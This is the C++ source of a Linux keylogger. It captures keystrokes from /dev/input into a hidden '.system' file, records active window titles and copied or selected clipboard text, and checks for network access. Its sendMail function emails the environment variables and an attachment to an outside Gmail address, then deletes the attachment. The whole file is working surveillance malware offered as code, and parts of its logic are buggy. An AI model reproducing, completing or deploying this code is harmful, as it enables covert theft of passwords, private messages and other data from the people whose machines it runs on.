#include "KeyloggerLib.h"

string   ACTIVE_WINDOW="";


void GetKeys(const char* kbd_dev)
{
  // kbd_dev should be keyboard device found in /dev/input (need root by default)
  int kbd = open(kbd_dev, O_RDONLY);
  if(kbd == -1) kbd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
  if(kbd != -1)
  {
    input_event ie;
    char s;
    int x, keyCode;
    bool last_up(false), upper(false), symbole, numLock(true);
    /*_* special is :
    * 0: not used
    * 1: RIGHT TAB
    * 2: LEFT TAB
    * 3: RIGHT ALT
    * 4: LEFT ALT
    *_*/
    int special, ctrlH;
    bool immediat=false, ctrl=false, alt=false, altgr=false;
    ofstream f;
    ifstream aw;
    while(x=read(kbd, &ie, sizeof(ie)))
    {
      aw.open(".AW");
      string lstW;
      f.open(".system", ios::app);

      if(!immediat){
        if(ie.code == 4) {keyCode = ie.value; immediat=true;}
        else if(ie.code == 1) //For the Caps button
        { immediat=false;
          if(ie.value == 1 && last_up){
            upper=true;
            f<<"[CAP_up]";
          }
          else if(ie.value == 0 && last_up){
            upper=false;
            f<<"[CAP_down]";
          }
        }
        else if(ie.code == 54 && special != 0) //For the alt button
        { immediat=false;
          if(ie.value== 2 || ie.value== 1) //right tab is pressed and not released => upper letter or a special num
            symbole = true;
          else {// == 0 on principe: TAB key is released
            symbole = false;
            special = 0;
          }
        }
        else{ immediat=false;
          getline(aw, ACTIVE_WINDOW);
          aw.close();
          system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}'>.AW");
          aw.open(".AW");
          getline(aw, lstW);
          cout<<lstW<<" vs "<<ACTIVE_WINDOW<<endl;
          if(lstW != ACTIVE_WINDOW)
          {
            f<<"\n*_*"<<lstW<<"*_*\n";
            ACTIVE_WINDOW = lstW;
          }
        }
      }
      else{
        //*_* Support keys that ie.code != keyCode via immediat *_*
        if((ie.code == keyCode || immediat) && (ie.value==1||ie.value==2))
        {
            if(keyCode == 46 && ctrl){
              f<<"<CopiedText>"<<*getClipBoard("CLIPBOARD", "UTF8_STRING")|| *getClipBoard("CLIPBOARD", "STRING");
              f<<"<SelectedText>"<<*getClipBoard("PRIMARY", "UTF8_STRING")<<'\n';
            }
            if(keyCode != 29 ) ctrl=false;
            if(keyCode != 56 ) alt=false;
            if(keyCode != 157 ) altgr=false;
            last_up=false;
            if(keyCode == 58) {
              last_up=true;
            }
            else if(keyCode == 1) f<<"[ESC]";
            else if(keyCode == 14) f<<"[BACKSPACE]";
            else if(keyCode == 15) f<<"[TAB]";
            else if(keyCode == 28) f<<"[Enter]\n";
            else if(keyCode == 29) {if(!ctrl) f<<"[LCTRL]"; ctrl=true;}
            else if(keyCode == 56) {if(!alt) f<<"[ALT]"; alt=true;}
            else if(keyCode == 57) f<<"[Space]";
            else if(keyCode == 69) {numLock=!numLock;f<<numLock?"[numLock_on]":"[numLock_off]";}
            else if(keyCode == 219) f<<"[Window_Button]";
            else if(keyCode == 156) f<<"[Enter_sec]";
            else if(keyCode == 157) {if(!ctrl) f<<"[RCTRL]"; ctrl=true;}
            else if(keyCode == 157) {if(!altgr) f<<"[AltGr]"; altgr=true;}
            else if(keyCode == 200) f<<"[U↑]";
            else if(keyCode == 203) f<<"[L←]";
            else if(keyCode == 205) f<<"[R→]";
            else if(keyCode == 208) f<<"[D↓]";
            else if(keyCode == 211) f<<"[DEL]";

            else if(keyCode == 54) special=1;
            else if(keyCode == 42) special=2;
            else if(keyCode == 184) special=3;
            else if(keyCode == 56) special=4;

            else if((keyCode >= 16 && keyCode <=27)|| (keyCode >= 30 && keyCode <=40)|| (keyCode >= 44 && keyCode <=49)){
              letter_azerty(f, keyCode, upper xor((special==1)||(special==2)));
            }
            else if((keyCode >= 71 && keyCode <=82) && keyCode!=78 && keyCode!=74){
              num(f, keyCode);
            }
            else{
              others(f, keyCode, special);
            }
        }
        immediat=false;
      }
      //std::cout<<x<<" char read, Key Code: " << ie.code << "    Value: " << ie.value << "\n";
      //f<<x<<" char read, Key Code: " << ie.code << "    Value: " << ie.value << "\n";
        //for(int i=0; i<5; i++) //read 5 attempts
      	  //x=read(kbd, &ie, sizeof(ie));
    aw.close();
    f.close();
    }
    close(kbd);
  }
}

int (*charType)(int);

void* sendMail(void* )
{
  ///signal(SIGINT, quit);
  bool sent=false;
  unsigned int i;
  FILE *output;
  int error=100;
  while(!sent)
  {
    output = popen("echo `env` | mail.mailutils -A m.g -e -s 'Education'  tapalanga@gmail.com", "r");
    if(output == NULL) {
        sleep(20);
        error--;
        if(!error)
          exit(0);
        continue;
    }
    fscanf(output,"%u",&i);
    pclose(output);
    sent=(bool) i;
    //cout<<"sent is: "<<sent<<endl;
  }
  sleep(5);
  system("rm m.g 2> /dev/null");
  pthread_exit(0);
}
bool checkInternet()
{
  bool dynamicRoute=false;
  FILE *output;
  output = popen("/sbin/route -n | grep -c '^0\\.0\\.0\\.0'","r");
  if(!output)
      return false;

  unsigned int i;
  fscanf(output,"%u",&i);
  pclose(output);
  dynamicRoute=(bool) i && !(system("ping -c1 -s1 www.google.com > /dev/null"));
  //cout<<dynamicRoute<<endl;
  return dynamicRoute;
}


void letter_azerty(ofstream& file, int val, bool upper)
{
  char key=val;
  if(!upper)
    charType = tolower;
  else
    charType = toupper;
  switch(val){
    case 16: file<<char(charType(16+81));break;//pthread_exit(0);
    case 17: file<<char(charType('z'));break; //f<<'b';
    case 18: file<<char(charType('e'));break;
    case 19: file<<char(charType('r'));break;
    case 20: file<<char(charType('t'));break;
    case 21: file<<char(charType('y'));break;
    case 22: file<<char(charType('u'));break;
    case 23: file<<char(charType('i'));break;
    case 24: file<<char(charType('o'));break;
    case 25: file<<char(charType('p'));break;

    case 30: file<<char(charType('q'));break;
    case 31: file<<char(charType('s'));break;
    case 32: file<<char(charType('d'));break;
    case 33: file<<char(charType('f'));break;
    case 34: file<<char(charType('g'));break;
    case 35: file<<char(charType('h'));break;
    case 36: file<<char(charType('j'));break;
    case 37: file<<char(charType('k'));break;
    case 38: file<<char(charType('l'));break;
    case 39: file<<char(charType('m'));;break;

    case 44: file<<char(charType('w'));break;
    case 45: file<<char(charType('x'));break;
    case 46: file<<char(charType('c'));break;
    case 47: file<<char(charType('v'));break;
    case 48: file<<char(charType('b'));break;
    case 49: file<<char(charType('n'));break;
      //...
  }
}

void num(ofstream& file, int val)
{
  switch(val)
  {
    case 71:file<<7;break;
    case 72:file<<8;break;
    case 73:file<<9;break;
    case 75:file<<4;break;
    case 76:file<<5;break;
    case 77:file<<6;break;
    case 79:file<<1;break;
    case 80:file<<2;break;
    case 81:file<<3;break;
    case 82:file<<0;break;
    //case 2:
    //..
  }
}

void others(ofstream& file, int val, int special)
{
  /*_* special is :
  * 0: special key not used
  * 1: RIGHT TAB
  * 2: LEFT TAB
  * 3: RIGHT ALT
  * 4: LEFT ALT
  *_*/
  switch(val)
  {
    case 2: if(special== 1|| special==2)file<<'1';
          else if(special == 3)file<<"¹";
          else file<<'&';
          break;
    case 3: switch(special) {
          case 1: file<<'2';break;
          case 2: file<<'2';break;
          case 3: file<<'~';break;
          case 4: break; //file<<'noChar';
          default: file<<"é";
        }
          break;
    case 4: if(special== 1|| special==2)file<<'3';
            else if(special == 3)file<<'#';
            else file<<'"';
            break;
    case 5: if(special== 1|| special==2)file<<'4';
            else if(special == 3)file<<'{';
            else file<<'\'';
            break;
    case 6: if(special== 1|| special==2)file<<'5';
            else if(special == 3)file<<'[';
            else file<<'(';
            break;
    case 7: if(special== 1|| special==2)file<<'6';
            else if(special == 3)file<<'|';
            else file<<'-';
            break;
    case 8: if(special== 1|| special==2)file<<'7';
            else if(special == 3)file<<'`';
            else file<<"è";
            break;
    case 9: if(special== 1|| special==2)file<<'8';
            else if(special == 3)file<<'\\';
            else file<<'_';
            break;
    case 10: if(special== 1|| special==2)file<<'9';
            else if(special == 3)file<<'^';
            else file<<"ç";
            break;
    case 11: if(special== 1|| special==2)file<<'0';
            else if(special == 3)file<<'@';
            else file<<"à";
            break;
    case 12: if(special== 1|| special==2)file<<"°";
            else if(special == 3)file<<']';
            else file<<')';
            break;
    case 13: if(special== 1|| special==2)file<<'+';
            else if(special == 3)file<<'}';
            else file<<'=';
            break;
    case 26: if(special== 1|| special==2)file<<"¨";
            else if(special == 3)file<<"¨";
            else file<<'^';
            break;
    case 27: if(special== 1|| special==2)file<<"£";
            else if(special == 3)file<<"¤";
            else file<<"$";
            break;
    case 41: if(special== 1|| special==2)file<<'~';
            else if(special == 3)file<<"¬";
            else file<<"²";
            break;
    case 40: if(special== 1|| special==2)file<<'%';
            else if(special == 3)file<<'^';
            else file<<"ù";
            break;
    case 43: if(special== 1|| special==2)file<<"µ";
            else if(special == 3)file<<'`';
            else file<<'*';
            break;
    case 50: if(special== 1|| special==2)file<<'?';
            else if(special == 3)file<<"´";
            else file<<',';
            break;
    case 51: if(special== 1|| special==2)file<<'.';
            else if(special == 3)file<<"─";
            else file<<';';
            break;
    case 52: if(special== 1|| special==2)file<<'/';
            else if(special == 3)file<<"·";
            else file<<':';
            break;
    case 53: if(special== 1|| special==2)file<<"§";
            else if(special == 3)file<<"̣̣̣̣̣̣̣̣̣"; //'̣̣ ';
            else file<<'!';
            break;

    case 83:file<<'.';break;
    case 78:file<<'+';break;
    case 74:file<<'-';break;
    case 55:file<<'*';break;
    case 181:file<<'/';break;
  }
}

char* getClipBoard(const char *bufname, const char *fmtname)
{
  Display *display = XOpenDisplay(NULL);
  unsigned long color = BlackPixel(display, DefaultScreen(display));
  Window window = XCreateSimpleWindow(display, DefaultRootWindow(display), 0,0, 1,1, 0, color, color);
  char *result;
  unsigned long ressize, restail;
  int resbits;
  Atom bufid = XInternAtom(display, bufname, False),
       fmtid = XInternAtom(display, fmtname, False),
       propid = XInternAtom(display, "XSEL_DATA", False),
       incrid = XInternAtom(display, "INCR", False);
  XEvent event;

  XConvertSelection(display, bufid, fmtid, propid, window, CurrentTime);
  do {
    XNextEvent(display, &event);
  } while (event.type != SelectionNotify || event.xselection.selection != bufid);

  if (event.xselection.property)
  {
    XGetWindowProperty(display, window, propid, 0, LONG_MAX/4, False, AnyPropertyType,
      &fmtid, &resbits, &ressize, &restail, (unsigned char**)&result);

    if (fmtid == incrid)
      strncpy(result, "<Erorr: Buffer is too large>", 28);//printf("Buffer is too large and INCR reading is not implemented yet.\n");
    //else
      //printf("[<CopiedText>: %.*s]\n", (int)ressize, result);

    //XFree(result);
    XDestroyWindow(display, window);
    XCloseDisplay(display);
    return result;
  }
  else // request failed, e.g. owner can't convert to the target format
  {
    XDestroyWindow(display, window);
    XCloseDisplay(display);
    return NULL;
  }
}
